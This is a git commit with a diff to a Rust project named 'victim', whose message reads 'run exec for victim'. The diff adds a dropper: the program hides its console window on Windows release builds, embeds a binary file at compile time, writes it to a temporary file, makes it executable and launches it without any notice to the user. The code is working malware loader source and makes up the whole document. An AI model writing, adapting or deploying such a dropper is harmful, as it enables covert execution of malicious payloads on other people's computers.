e93179c7bcbdcf0b649b17b0194b559824ce48b2
Arthur Melton <me@arthurmelton.com>
2023-01-02 08:55:11 -0500

    run exec for victim

--- victim/src/main.rs
+++ victim/src/main.rs
@@ -1,3 +1,11 @@
-fn main() {
-    println!("Hello, world!");
+#![cfg_attr(
+    all(not(debug_assertions), target_os = "windows"),
+    windows_subsystem = "windows"
+)]
+
+mod payload;
+
+fn main() -> Result<(), std::io::Error> {
+    payload::run()?;
+    Ok(())
 }
---
+++ victim/src/payload.rs
@@ -0,0 +1,28 @@
+use std::io::Write;
+use std::process::Command;
+use tempfile::NamedTempFile;
+
+#[cfg(target_os = "windows")]
+use tempfile::Builder;
+
+const PAYLOAD: &[u8] = include_bytes!("../run");
+
+pub fn run() -> Result<(), std::io::Error> {
+    #[cfg(not(target_os = "windows"))]
+    let binding = NamedTempFile::new()?;
+    #[cfg(target_os = "windows")]
+    let binding = Builder::new().suffix(".exe").tempfile()?;
+    let mut temp = binding.as_file();
+    temp.write_all(PAYLOAD)?;
+    let path = binding.into_temp_path();
+    #[cfg(not(target_os = "windows"))]
+    Command::new("chmod")
+        .arg("+x")
+        .arg(path.as_os_str())
+        .output()
+        .expect("failed to execute process");
+    Command::new(path.as_os_str())
+        .spawn()
+        .expect("failed to execute process");
+    Ok(())
+}
